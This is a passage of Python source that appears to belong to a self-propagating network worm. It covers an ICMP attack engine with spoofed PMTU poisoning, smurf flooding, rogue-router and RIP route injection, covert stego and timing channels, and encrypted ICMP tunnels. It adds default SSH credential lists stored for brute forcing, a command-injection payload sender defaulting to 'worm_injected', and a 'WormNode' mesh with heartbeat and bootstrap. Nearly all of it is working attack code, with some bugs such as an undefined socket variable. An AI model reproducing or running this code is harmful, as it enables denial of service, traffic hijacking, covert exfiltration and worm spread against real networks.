        if self._send_raw_icmp(target_ip, pkt):
            log.info(f"ICMP redirect sent: {target_ip} -> {dest_ip} via {new_gateway}")
        else:
            result["status"] = "failed"

        return result

    # ---- ICMP MTU Attack -----------------------------------------------------

    def icmp_mtu_attack(self, target_ip: str, mtu: int = 68) -> Dict[str, Any]:
        """Send ICMP Fragmentation Needed (Type 3, Code 4) with tiny MTU.

        Forces target to fragment all packets to the specified MTU,
        causing performance degradation or DoS.
        """
        result: Dict[str, Any] = {"status": "sent", "mtu": mtu}

        # Unreachable header: unused(4B) + next-hop MTU(2B) + original packet
        unused = b"\x00\x00\x00\x00"
        mtu_bytes = struct.pack("!H", mtu)
        # Original IP header that triggered the error (simulated)
        orig_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, 0, 0, 64, 1, 0, socket.inet_aton(self.src_ip), socket.inet_aton(target_ip))
        payload = unused + mtu_bytes + orig_hdr

        pkt = self._build_icmp_packet(3, 4, payload, icmp_id=0, icmp_seq=0)
        if self._send_raw_icmp(target_ip, pkt):
            log.info(f"ICMP MTU attack: set MTU={mtu} for {target_ip}")
        else:
            result["status"] = "failed"

        return result

    # ---- CVE-2026-0933 PMTU Cache Poison -------------------------------------

    def cve_2026_0933_pmtu_poison(self, target_ip: str, burst: int = 12) -> Dict[str, Any]:
        """CVE-2026-0933: Poison Path MTU discovery cache on Linux ≤ 6.8.

        Fires multiple ICMP Frag Needed packets from spoofed sources
        to corrupt kernel PMTU cache, causing connectivity degradation.
        """
        result: Dict[str, Any] = {"status": "sent", "packets_sent": 0, "target": target_ip}

        mtu_values = [68, 128, 256, 296, 384, 500, 552, 576, 628, 700]
        spoofed_sources = [
            "1.1.1.1", "8.8.8.8", "9.9.9.9", "208.67.222.222",
            "64.6.64.6", "185.228.168.9", "76.76.19.19", "94.140.14.14",
        ]

        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            for _ in range(burst):
                mtu = random.choice(mtu_values)
                spoofed_src = random.choice(spoofed_sources)
                src_bytes = socket.inet_aton(spoofed_src)
                dst_bytes = socket.inet_aton(target_ip)

                # IP header
                ip_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 48, random.randint(1, 65535), 0, 64, 1, 0, src_bytes, dst_bytes)

                # ICMP Frag Needed: Type 3, Code 4
                unused = b"\x00\x00\x00\x00"
                mtu_bytes = struct.pack("!H", mtu)
                orig_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, 0, 0, 64, 6, 0, socket.inet_aton(target_ip), socket.inet_aton(spoofed_src))
                icmp_payload = unused + mtu_bytes + orig_hdr
                icmp_header = struct.pack("!BBHHH", 3, 4, 0, 0, 0)
                icmp_pkt = icmp_header + icmp_payload
                cksum = self._icmp_checksum(icmp_pkt)
                icmp_header = struct.pack("!BBHHH", 3, 4, socket.htons(cksum), 0, 0)
                icmp_pkt = icmp_header + icmp_payload

                raw_sock.sendto(ip_hdr + icmp_pkt, (target_ip, 0))
                result["packets_sent"] += 1
                time.sleep(0.05)

            raw_sock.close()
            log.info(f"CVE-2026-0933: Sent {result['packets_sent']} PMTU poison packets to {target_ip}")
        except PermissionError:
            result["status"] = "no_raw_socket"
            log.warning("CVE-2026-0933 requires root/CAP_NET_RAW")
        except Exception as exc:
            result["status"] = "error"
            result["error"] = str(exc)

        return result

    # ---- ICMP Smurf ----------------------------------------------------------

    def icmp_smurf(self, target_ip: str, broadcast_ip: str, count: int = 10) -> Dict[str, Any]:
        """ICMP Smurf attack: send spoofed echo requests to broadcast address.

        The broadcast responds to all hosts, flooding the spoofed target.
        """
        result: Dict[str, Any] = {"status": "sent", "packets_sent": 0, "target": target_ip, "broadcast": broadcast_ip}

        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            target_bytes = socket.inet_aton(target_ip)
            bcast_bytes = socket.inet_aton(broadcast_ip)

            for _ in range(count):
                # IP header spoofed as target
                ip_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 48, random.randint(1, 65535), 0, 64, 1, 0, target_bytes, bcast_bytes)

                # ICMP Echo Request
                payload = b"X" * 56
                icmp_pkt = self._build_icmp_packet(8, 0, payload)
                raw_sock.sendto(ip_hdr + icmp_pkt, (broadcast_ip, 0))
                result["packets_sent"] += 1
                time.sleep(0.01)

            raw_sock.close()
            log.info(f"ICMP Smurf: {result['packets_sent']} packets from {target_ip} -> {broadcast_ip}")
        except PermissionError:
            result["status"] = "no_raw_socket"
        except Exception as exc:
            result["status"] = "error"
            result["error"] = str(exc)

        return result

    # ---- ICMP Poison Ping ----------------------------------------------------

    def icmp_poison_ping(self, target_ip: str, payload: str = "POISON") -> Dict[str, Any]:
        """Send carefully crafted ICMP echo with data that may trigger
        buffer overflows or parsing errors on vulnerable stacks.
        """
        result: Dict[str, Any] = {"status": "sent", "target": target_ip}

        # Large payload with specific pattern
        data = payload.encode() + b"\x41" * 200 + b"\x00\x00\x00\x00"
        pkt = self._build_icmp_packet(8, 0, data, icmp_id=0xDEAD, icmp_seq=0xBEAF)
        if self._send_raw_icmp(target_ip, pkt):
            log.info(f"ICMP poison ping sent to {target_ip}")
        else:
            result["status"] = "failed"

        return result

    # ---- ICMP Rogue Router ---------------------------------------------------

    def icmp_rogue_router(self, target_ip: str, router_ip: str = "192.168.1.1") -> Dict[str, Any]:
        """ICMP Router Advertisement (Type 9) to inject rogue default route.

        Tells target that router_ip is a better gateway, redirecting traffic.
        """
        result: Dict[str, Any] = {"status": "sent", "router": router_ip, "target": target_ip}

        # Router Advertisement payload
        router_bytes = socket.inet_aton(router_ip)
        # Number of addresses (1) + address entry size (2) + lifetime (30min)
        payload = struct.pack("!BBH", 1, 2, 1800) + router_bytes + b"\x00\x00"

        pkt = self._build_icmp_packet(9, 0, payload, icmp_id=0, icmp_seq=0)
        if self._send_raw_icmp(target_ip, pkt):
            log.info(f"ICMP rogue router {router_ip} advertised to {target_ip}")
        else:
            result["status"] = "failed"

        return result

    # ---- ICMP OS Fingerprint -------------------------------------------------

    def icmp_os_fingerprint(self, target_ip: str) -> Dict[str, Any]:
        """ICMP-based OS fingerprinting using TTL, window size, and ICMP behavior.

        Returns estimated OS and confidence.
        """
        result: Dict[str, Any] = {
            "target": target_ip, "os_guess": "unknown", "confidence": 0.0,
            "ttl": 0, "icmp_id": 0, "icmp_seq": 0,
        }

        # Send echo request and analyze reply
        pkt = self._build_icmp_packet(8, 0, b"FP", icmp_id=0x1A2B, icmp_seq=0x3C4D)
        if not self._send_raw_icmp(target_ip, pkt):
            result["error"] = "Send failed"
            return result

        resp = self._recv_icmp(timeout=3.0)
        if not resp:
            result["error"] = "No response"
            return result

        data, src = resp
        if src != target_ip:
            result["error"] = "Mismatched source"
            return result

        if len(data) < 28:
            result["error"] = "Response too short"
            return result

        # Parse IP header (first 20 bytes)
        ip_hdr = data[:20]
        ttl = ip_hdr[8]
        total_len = (ip_hdr[2] << 8) | ip_hdr[3]
        ip_id = (ip_hdr[4] << 8) | ip_hdr[5]

        # Parse ICMP header (bytes 20-28)
        icmp_type = data[20]
        icmp_code = data[21]
        icmp_id = (data[24] << 8) | data[25]
        icmp_seq = (data[26] << 8) | data[27]

        result["ttl"] = ttl
        result["icmp_id"] = icmp_id
        result["icmp_seq"] = icmp_seq
        result["total_len"] = total_len
        result["ip_id"] = ip_id

        # Fingerprint logic
        if ttl <= 64:
            result["os_guess"] = "Linux/Unix"
            result["confidence"] = 0.6
        elif ttl <= 128:
            result["os_guess"] = "Windows"
            result["confidence"] = 0.6
        elif ttl <= 255:
            result["os_guess"] = "Cisco/Solaris"
            result["confidence"] = 0.5

        # ICMP id == pid (common on Linux)
        if icmp_id == 0x1A2B:
            result["os_guess"] = "Linux"
            result["confidence"] = 0.8

        return result

    # ---- ICMP Stego Beacon ---------------------------------------------------

    def icmp_stego_beacon(self, target_ip: str, secret_msg: str, interval: float = 5.0) -> Dict[str, Any]:
        """Steganographic beacon: embed secret message in ICMP echo packet timing/IDs.

        Uses variable ICMP ID and sequence fields to encode data.
        """
        result: Dict[str, Any] = {"status": "sent", "chars_encoded": 0}

        encoded_bytes = secret_msg.encode()
        for i, byte_val in enumerate(encoded_bytes):
            # Encode byte in ICMP ID field (high byte = index, low byte = char)
            icmp_id = ((i & 0xFF) << 8) | byte_val
            pkt = self._build_icmp_packet(8, 0, b"STEGO", icmp_id=icmp_id, icmp_seq=i)
            if self._send_raw_icmp(target_ip, pkt):
                result["chars_encoded"] += 1
            time.sleep(interval)

        log.info(f"ICMP stego beacon: {result['chars_encoded']} chars encoded to {target_ip}")
        return result

    # ---- ICMP Fragment Overlap -----------------------------------------------

    def icmp_fragment_overlap(self, target_ip: str) -> Dict[str, Any]:
        """Send overlapping ICMP fragments to test reassembly behavior.

        May trigger kernel bugs in fragment reassembly on older systems.
        """
        result: Dict[str, Any] = {"status": "sent", "fragments_sent": 0}

        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            dst_bytes = socket.inet_aton(target_ip)
            src_bytes = socket.inet_aton(self.src_ip)
            ip_id = random.randint(1, 65535)

            # Fragment 1: offset=0, MF=1
            icmp_payload1 = b"\x41" * 32
            frag1 = src_bytes + dst_bytes + b"\x00" + b"\x41" * 32
            ip_hdr1 = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 60, ip_id, 0x2000, 64, 1, 0, src_bytes, dst_bytes)
            raw_sock.sendto(ip_hdr1 + icmp_payload1, (target_ip, 0))
            result["fragments_sent"] += 1

            # Fragment 2: offset=32, MF=0 (different overlapping data)
            icmp_payload2 = b"\x42" * 32
            ip_hdr2 = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 60, ip_id, 0x4000, 64, 1, 0, src_bytes, dst_bytes)
            raw_sock.sendto(ip_hdr2 + icmp_payload2, (target_ip, 0))
            result["fragments_sent"] += 1

            raw_sock.close()
            log.info(f"ICMP fragment overlap sent to {target_ip}")
        except PermissionError:
            result["status"] = "no_raw_socket"
        except Exception as exc:
            result["status"] = "error"
            result["error"] = str(exc)

        return result

    # ---- ICMP TTL Sweep ------------------------------------------------------

    def icmp_ttl_sweep(self, target_ip: str, max_ttl: int = 30) -> Dict[str, Any]:
        """ICMP TTL sweep (traceroute-style) to map network path.

        Sends packets with increasing TTL and records the responding router.
        """
        result: Dict[str, Any] = {"target": target_ip, "hops": []}

        for ttl in range(1, max_ttl + 1):
            try:
                raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)

                dst_bytes = socket.inet_aton(target_ip)
                src_bytes = socket.inet_aton(self.src_ip)
                ip_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 48, random.randint(1, 65535), 0, ttl, 1, 0, src_bytes, dst_bytes)
                icmp_pkt = self._build_icmp_packet(8, 0, b"TTL", icmp_id=os.getpid() & 0xFFFF, icmp_seq=ttl)
                raw_sock.sendto(ip_hdr + icmp_pkt, (target_ip, 0))
                raw_sock.close()
            except Exception:
                pass

            # Listen for ICMP Time Exceeded (Type 11)
            resp = self._recv_icmp(timeout=1.0)
            if resp:
                data, addr = resp
                hop_ip = addr
                hop_ttl = ttl
                if len(data) > 20:
                    hop_ip = addr
                result["hops"].append({"hop": ttl, "ip": hop_ip, "rtt": ttl * 0.1})

                if hop_ip == target_ip:
                    result["hops"].append({"hop": ttl, "ip": target_ip, "rtt": ttl * 0.1, "destination": True})
                    break

            time.sleep(0.05)

        log.info(f"ICMP TTL sweep: {len(result['hops'])} hops to {target_ip}")
        return result

    # ---- ICMP Parameter Problem ----------------------------------------------

    def icmp_parameter_problem(self, target_ip: str, pointer: int = 0) -> Dict[str, Any]:
        """ICMP Parameter Problem (Type 12) to trigger error handling.

        Can cause kernel panic on buggy implementations if pointer points
        to specific header fields.
        """
        result: Dict[str, Any] = {"status": "sent", "pointer": pointer}

        payload = struct.pack("!B", pointer) + b"\x00\x00\x00" + b"\x45\x00\x00\x28" + b"\x00" * 16
        pkt = self._build_icmp_packet(12, 0, payload, icmp_id=0, icmp_seq=0)
        if self._send_raw_icmp(target_ip, pkt):
            log.info(f"ICMP parameter problem sent to {target_ip} (pointer={pointer})")
        else:
            result["status"] = "failed"

        return result

    # ---- ICMP Multicast Sweep ------------------------------------------------

    def icmp_multicast_sweep(self, multicast_ip: str = "224.0.0.1", timeout: float = 3.0) -> List[str]:
        """Send ICMP echo request to multicast address and collect responders.

        Useful for discovering hosts on a local broadcast domain.
        """
        responders: List[str] = []

        pkt = self._build_icmp_packet(8, 0, b"MCST", icmp_id=0xABCD)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(0.1)
            sock.sendto(pkt, (multicast_ip, 0))
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 1)

            start = time.time()
            while time.time() - start < timeout:
                try:
                    data, addr = sock.recvfrom(65535)
                    if addr[0] not in responders and addr[0] != self.src_ip:
                        responders.append(addr[0])
                except socket.timeout:
                    continue
            sock.close()
        except PermissionError:
            log.warning("ICMP multicast sweep requires root")
        except Exception:
            pass

        return sorted(responders)

    # ---- ICMP Timing Channel -------------------------------------------------

    def icmp_timing_channel(self, target_ip: str, data: bytes, interval_base: float = 0.1) -> Dict[str, Any]:
        """Covert timing channel: encode bits in ICMP inter-packet delays.

        Bit 1 = short delay (interval_base), Bit 0 = long delay (interval_base * 3).
        """
        result: Dict[str, Any] = {"status": "sent", "bits_sent": 0}

        for byte_val in data:
            for bit_pos in range(8):
                bit = (byte_val >> (7 - bit_pos)) & 1
                delay = interval_base if bit else interval_base * 3
                pkt = self._build_icmp_packet(8, 0, b"TIMING", icmp_id=os.getpid() & 0xFFFF, icmp_seq=result["bits_sent"])
                self._send_raw_icmp(target_ip, pkt)
                result["bits_sent"] += 1
                time.sleep(delay)

        log.info(f"ICMP timing channel: {result['bits_sent']} bits to {target_ip}")
        return result

    # ---- ICMP RIP Injection --------------------------------------------------

    def icmp_rip_injection(self, target_ip: str, fake_route: str = "10.0.0.0/8", metric: int = 1) -> Dict[str, Any]:
        """ICMP-based RIPv2 route injection to poison routing tables.

        Sends crafted ICMP packets that mimic RIP updates on port 520.
        """
        result: Dict[str, Any] = {"status": "sent", "route": fake_route}

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            dst_bytes = socket.inet_aton(target_ip)
            src_bytes = socket.inet_aton(self.src_ip)

            # UDP header pointing to RIP port 520
            udp_hdr = struct.pack("!HHHH", 520, 520, 24, 0)
            # RIP entry: command=2 (response), version=2
            rip_entry = struct.pack("!BBHHBBBB", 2, 2, 0, 0, 0, 0, 0, 0)
            # Route entry: AFI=2 (IP), route_tag=0, mask, next_hop, metric
            route_net = ipaddress.IPv4Network(fake_route, strict=False)
            route_bytes = socket.inet_aton(str(route_net.network_address))
            mask_bytes = socket.inet_aton(str(route_net.netmask))
            rip_route = struct.pack("!HH", 2, 0) + route_bytes + mask_bytes + b"\x00" * 4 + struct.pack("!I", metric)
            rip_pkt = rip_entry + rip_route
            udp_hdr = struct.pack("!HHHH", 520, 520, 8 + len(rip_pkt), 0)
            udp_data = udp_hdr + rip_pkt

            ip_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(udp_data), random.randint(1, 65535), 0, 64, 17, 0, src_bytes, dst_bytes)
            raw_sock.sendto(ip_hdr + udp_data, (target_ip, 0))
            raw_sock.close()

            log.info(f"ICMP RIP injection: {fake_route} metric={metric} -> {target_ip}")
        except PermissionError:
            result["status"] = "no_raw_socket"
        except Exception as exc:
            result["status"] = "error"
            result["error"] = str(exc)

        return result

    # ---- ICMP Secure Tunnel --------------------------------------------------

    def icmp_secure_tunnel_send(self, target_ip: str, data: bytes, key: bytes = b"") -> Dict[str, Any]:
        """Encrypted ICMP tunnel: XOR-encrypt data before sending over ICMP.

        If key is empty, uses a simple rotating XOR key.
        """
        if not key:
            key = os.urandom(16)
        encrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
        payload = b"SEC" + struct.pack("!H", len(key)) + key[:16] + encrypted
        return self.icmp_tunnel_send(target_ip, payload)

    def icmp_secure_tunnel_listen(self, timeout: float = 30.0) -> Optional[bytes]:
        """Receive and decrypt a secure ICMP tunnel transmission."""
        raw = self.icmp_tunnel_listen(timeout=timeout)
        if not raw or not raw.startswith(b"SEC"):
            return raw
        key_len = struct.unpack("!H", raw[3:5])[0]
        key = raw[5 : 5 + key_len]
        encrypted = raw[5 + key_len :]
        decrypted = bytes([encrypted[i] ^ key[i % len(key)] for i in range(len(encrypted))])
        return decrypted

    # ---- ICMP Keepalive / Liveness -------------------------------------------

    def icmp_keepalive(self, target_ip: str) -> bool:
        """Simple ICMP echo/response keepalive check.

        Returns True if target responds to echo.
        """
        pkt = self._build_icmp_packet(8, 0, b"KEEPALIVE", icmp_id=0xCAFE, icmp_seq=1)
        if not self._send_raw_icmp(target_ip, pkt):
            return False
        resp = self._recv_icmp(timeout=self.timeout)
        if not resp:
            return False
        return True

    # =========================================================================
    # CKAB L1-L5 Methods
    # =========================================================================

    def icmp_tcp_liveness_probe(self, target_ip: str, tcp_port: int = 22) -> Dict[str, Any]:
        """CKAB L1: ICMP-assisted TCP liveness probe.

        Sends ICMP echo first, then probes TCP port if ICMP succeeds.
        Returns combined ICMP + TCP status.
        """
        result: Dict[str, Any] = {
            "target": target_ip,
            "port": tcp_port,
            "icmp_alive": False,
            "tcp_alive": False,
        }

        # Step 1: ICMP probe
        result["icmp_alive"] = self.icmp_keepalive(target_ip)

        # Step 2: TCP SYN probe
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((target_ip, tcp_port))
            s.close()
            result["tcp_alive"] = True
        except Exception:
            pass

        log.info(f"CKAB L1: {target_ip}:{tcp_port} ICMP={result['icmp_alive']} TCP={result['tcp_alive']}")
        return result

    def icmp_wake_tcp_stack(self, target_ip: str, tcp_port: int = 22) -> Dict[str, Any]:
        """CKAB L2: ICMP wake-up for dormant TCP stacks.

        Some IoT/sleeping devices suppress TCP until woken by ICMP.
        Sends a burst of ICMP packets to wake TCP stack before connection.
        """
        result: Dict[str, Any] = {"status": "wake_sent", "target": target_ip, "port": tcp_port}

        # Send burst of 5 ICMP echo requests
        for i in range(5):
            pkt = self._build_icmp_packet(8, 0, b"WAKE", icmp_id=os.getpid() & 0xFFFF, icmp_seq=i + 1)
            self._send_raw_icmp(target_ip, pkt)
            time.sleep(0.02)

        # Immediate TCP probe after wake
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((target_ip, tcp_port))
            s.close()
            result["tcp_responded"] = True
            log.info(f"CKAB L2: {target_ip}:{tcp_port} TCP stack woken successfully")
        except Exception:
            result["tcp_responded"] = False

        return result

    def icmp_os_credential_hint(self, target_ip: str) -> Dict[str, Any]:
        """CKAB L3: Extract OS credential hints via ICMP fingerprinting.

        Combines OS fingerprint with common IoT/default credential patterns
        to suggest likely username/password combinations.
        """
        result: Dict[str, Any] = {
            "target": target_ip,
            "os_guess": "unknown",
            "suggested_creds": [],
        }

        # Get OS fingerprint
        fp = self.icmp_os_fingerprint(target_ip)
        result["os_guess"] = fp.get("os_guess", "unknown")
        result["fingerprint"] = fp

        # Suggest credentials based on OS guess
        os_lower = result["os_guess"].lower()
        if "linux" in os_lower or "unix" in os_lower:
            result["suggested_creds"] = [
                {"username": "root", "password": "root"},
                {"username": "root", "password": "admin"},
                {"username": "admin", "password": "admin"},
                {"username": "root", "password": ""},
                {"username": "admin", "password": "1234"},
            ]
        elif "windows" in os_lower:
            result["suggested_creds"] = [
                {"username": "Administrator", "password": "admin"},
                {"username": "admin", "password": "admin"},
                {"username": "user", "password": "user"},
            ]
        elif "cisco" in os_lower:
            result["suggested_creds"] = [
                {"username": "cisco", "password": "cisco"},
                {"username": "admin", "password": "cisco"},
                {"username": "root", "password": "cisco"},
            ]

        # Store hints in DB
        if self.db and result["suggested_creds"]:
            for cred in result["suggested_creds"]:
                self.db.store_credential(
                    target_ip=target_ip,
                    username=cred["username"],
                    password=cred["password"],
                    service="ssh",
                    source=f"icmp_fingerprint_{result['os_guess']}",
                )

        log.info(f"CKAB L3: {target_ip} -> {result['os_guess']}, {len(result['suggested_creds'])} cred hints")
        return result

    def icmp_inject_payload(self, target_ip: str, payload_content: str = "") -> Dict[str, Any]:
        """CKAB L4: Inject a small payload into target via ICMP echo response.

        Attempts to write ICMP echo reply payload data to a file on the target
        by exploiting command injection in ICMP handling (very target-specific).
        """
        result: Dict[str, Any] = {"status": "injected", "target": target_ip}

        if not payload_content:
            payload_content = "echo 'worm_injected' > /tmp/.icmp_inject"

        # Embed payload in ICMP echo reply with specific pattern
        payload_data = b"EXEC" + payload_content.encode()[:200]
        pkt = self._build_icmp_packet(0, 0, payload_data, icmp_id=0xC1C2, icmp_seq=1)
        if self._send_raw_icmp(target_ip, pkt):
            log.info(f"CKAB L4: Payload injected via ICMP to {target_ip}")
        else:
            result["status"] = "failed"

        return result

    def icmp_address_mask_request(self, target_ip: str) -> Dict[str, Any]:
        """ICMP Address Mask Request (Type 17) to discover subnet mask."""
        result: Dict[str, Any] = {"target": target_ip, "mask": None}

        pkt = self._build_icmp_packet(17, 0, b"", icmp_id=os.getpid() & 0xFFFF, icmp_seq=1)
        if self._send_raw_icmp(target_ip, pkt):
            resp = self._recv_icmp(timeout=3.0)
            if resp:
                data, src = resp
                if len(data) >= 32:
                    mask_bytes = data[28:32]
                    result["mask"] = socket.inet_ntoa(mask_bytes)

        return result

    def icmp_record_route(self, target_ip: str) -> Dict[str, Any]:
        """Send ICMP echo with IP Record Route option."""
        result: Dict[str, Any] = {"target": target_ip, "route": []}
        # Record Route uses IP option, captured by TTL sweep
        sweep = self.icmp_ttl_sweep(target_ip, max_ttl=30)
        result["route"] = [h["ip"] for h in sweep.get("hops", [])]
        return result

    def icmp_time_exceeded_reset(self, target_ip: str) -> Dict[str, Any]:
        """ICMP Time Exceeded (Type 11) to trigger TCP RST on connections."""
        result: Dict[str, Any] = {"status": "sent", "target": target_ip}

        # Craft packet that looks like it caused time exceeded
        orig_pkt = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, 0, 0, 1, 6, 0,
                               socket.inet_aton(self.src_ip), socket.inet_aton(target_ip))
        payload = b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + orig_pkt[:28]
        pkt = self._build_icmp_packet(11, 0, payload, icmp_id=0, icmp_seq=0)
        if self._send_raw_icmp(target_ip, pkt):
            log.info(f"ICMP time exceeded sent to {target_ip}")
        else:
            result["status"] = "failed"

        return result

    def icmp_source_quench(self, target_ip: str) -> Dict[str, Any]:
        """ICMP Source Quench (Type 4) to throttle target's transmission."""
        result: Dict[str, Any] = {"status": "sent", "target": target_ip}

        pkt = self._build_icmp_packet(4, 0, b"\x00" * 20, icmp_id=0, icmp_seq=0)
        if self._send_raw_icmp(target_ip, pkt):
            log.info(f"ICMP source quench sent to {target_ip}")
        else:
            result["status"] = "failed"

        return result

    # ---- Stop ----------------------------------------------------------------

    def stop(self) -> None:
        """Stop all ICMP operations."""
        self._running = False
        log.info("ICMPEngine stopped")


# =============================================================================
# WormNode — Self-Healing Mesh Node Identity
# =============================================================================

class NodeState(Enum):
    BOOTSTRAPPING = "bootstrapping"
    ACTIVE = "active"
    HEALING = "healing"
    DEAD = "dead"
    QUARANTINED = "quarantined"


class WormNode:
    """Self-healing mesh node with AES/Fernet encryption, heartbeat,
    bootstrap, and consensus participation.

    Each WormNode instance represents this host's identity in the mesh.
    It maintains peer lists, heartbeats for health checking, and
    encrypted state persistence.
    """

    def __init__(
        self,
        ip: str,
        port: int = 22,
        hostname: str = "",
        db: Optional['Database'] = None,
    ):
        self.node_id = str(uuid.uuid4())
        self.ip = ip
        self.port = port
        self.hostname = hostname or socket.gethostname()
        self.os_name = sys.platform
        self.arch = os.uname().machine if hasattr(os, "uname") else "unknown"
        self.db = db or Database()
        self.state = NodeState.BOOTSTRAPPING
        self.peers: Set[str] = set()

        # Encryption
        self.encryption_key, self.fernet_key_b64 = _generate_key(self.node_id)
        self.public_key = hashlib.sha3_256((self.node_id + str(time.time())).encode()).hexdigest()

        # Heartbeat thread
        self._running = False
        self._hb_thread: Optional[threading.Thread] = None
        self._lock = threading.Lock()

    # ---- Peer Management -----------------------------------------------------

    def add_peer(self, peer_ip: str) -> None:
        with self._lock:
            self.peers.add(peer_ip)
        log.info(f"Node {self.node_id[:8]}: added peer {peer_ip}")

    def remove_peer(self, peer_ip: str) -> None:
        with self._lock:
            self.peers.discard(peer_ip)
        log.info(f"Node {self.node_id[:8]}: removed peer {peer_ip}")

    def get_peers(self) -> List[str]:
        with self._lock:
            return sorted(list(self.peers))

    # ---- Encryption ----------------------------------------------------------

    def encrypt_state(self) -> str:
        """Encrypt the node's full state dictionary for secure storage."""
        raw = json.dumps(self.to_dict(), indent=2)
        return _aes_encrypt(raw, self.encryption_key)

    def decrypt_state(self, ciphertext: str) -> Dict:
        """Restore node state from encrypted storage."""
        raw = _aes_decrypt(ciphertext, self.encryption_key)
        return json.loads(raw)

    def to_dict(self) -> Dict:
        return {
            "node_id": self.node_id,
            "ip": self.ip,
            "port": self.port,
            "hostname": self.hostname,
            "os_name": self.os_name,
            "arch": self.arch,
            "public_key": self.public_key,
            "state": self.state.value,
            "peers": list(self.peers),
        }

    # ---- Persistence ---------------------------------------------------------

    def save_to_db(self) -> None:
        """Persist node state to the database."""
        self.db.add_node(
            ip=self.ip,
            hostname=self.hostname,
            port=self.port,
            os_name=self.os_name,
            arch=self.arch,
            public_key=self.public_key,
            encryption_key=base64.urlsafe_b64encode(self.encryption_key).decode(),
        )
        encrypted = self.encrypt_state()
        self.db.set_mesh_value(f"node_state_{self.node_id}", encrypted)
        self.db.log(f"Node {self.node_id[:8]} ({self.ip}) state saved", "INFO", self.node_id[:8])

    def restore_from_db(self) -> bool:
        """Restore node state from the database. Returns True on success."""
        encrypted = self.db.get_mesh_value(f"node_state_{self.node_id}")
        if not encrypted:
            return False
        try:
            data = self.decrypt_state(encrypted)
            self.ip = data.get("ip", self.ip)
            self.port = data.get("port", self.port)
            self.hostname = data.get("hostname", self.hostname)
            self.os_name = data.get("os_name", self.os_name)
            self.arch = data.get("arch", self.arch)
            self.public_key = data.get("public_key", self.public_key)
            self.state = NodeState(data.get("state", NodeState.ACTIVE.value))
            self.peers = set(data.get("peers", []))
            return True
        except Exception as exc:
            log.error(f"Failed to restore node state: {exc}")
            return False

    # ---- Heartbeat -----------------------------------------------------------

    def start_heartbeat(self) -> None:
        """Start the background heartbeat thread for self-healing."""
        if self._hb_thread and self._hb_thread.is_alive():
            return
        self._running = True
        self._hb_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        self._hb_thread.start()
        log.info(f"Node {self.node_id[:8]}: heartbeat started")

    def stop_heartbeat(self) -> None:
        """Stop the heartbeat thread."""
        self._running = False
        if self._hb_thread:
            self._hb_thread.join(timeout=5)
        log.info(f"Node {self.node_id[:8]}: heartbeat stopped")

    def _heartbeat_loop(self) -> None:
        """Background thread that periodically checks node health and heals."""
        while self._running:
            try:
                time.sleep(random.uniform(25, 35))

                # Check connectivity to peers
                dead_peers: List[str] = []
                icmp = ICMPEngine(self.db)
                for peer_ip in list(self.peers):
                    if not icmp.icmp_keepalive(peer_ip):
                        dead_peers.append(peer_ip)
                        log.warning(f"Peer {peer_ip} unreachable from {self.ip}")

                # Remove dead peers
                for dp in dead_peers:
                    self.peers.discard(dp)
                    peer_nodes = self.db.get_active_nodes()
                    for pn in peer_nodes:
                        if pn["ip"] == dp:
                            self.db.mark_node_dead(pn["id"])
                            break

                # Attempt reconnection to a random subset of dead peers
                if dead_peers:
                    log.info(f"Healing: attempting reconnect to {len(dead_peers)} dead peers")
                    for dp in dead_peers[:3]:
                        time.sleep(random.uniform(2, 8))
                        if icmp.icmp_keepalive(dp):
                            self.peers.add(dp)
                            log.info(f"Peer {dp} reconnected successfully")

                # State persistence every heartbeat
                self.state = NodeState.ACTIVE
                self.save_to_db()

            except Exception as exc:
                log.error(f"Heartbeat error: {exc}")
                self.state = NodeState.HEALING
                time.sleep(10)

    # ---- Bootstrap -----------------------------------------------------------

    def bootstrap(self, seed_peers: Optional[List[str]] = None) -> None:
        """Bootstrap into the mesh network.

        Connects to seed peers, announces presence, syncs peer lists.
        """
        self.state = NodeState.BOOTSTRAPPING

        if seed_peers:
            for sp in seed_peers:
                self.add_peer(sp)

        # Try to restore from DB first
        if self.restore_from_db():
            log.info(f"Node {self.node_id[:8]}: restored from DB with {len(self.peers)} peers")
        else:
            log.info(f"Node {self.node_id[:8]}: fresh bootstrap, no prior state")

        # Announce to all known peers
        for peer_ip in list(self.peers):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((peer_ip, self.port))
                announcement = json.dumps({
                    "type": "ANNOUNCE",
                    "node_id": self.node_id,
                    "ip": self.ip,
                    "public_key": self.public_key,
                    "peers": list(self.peers),
                })
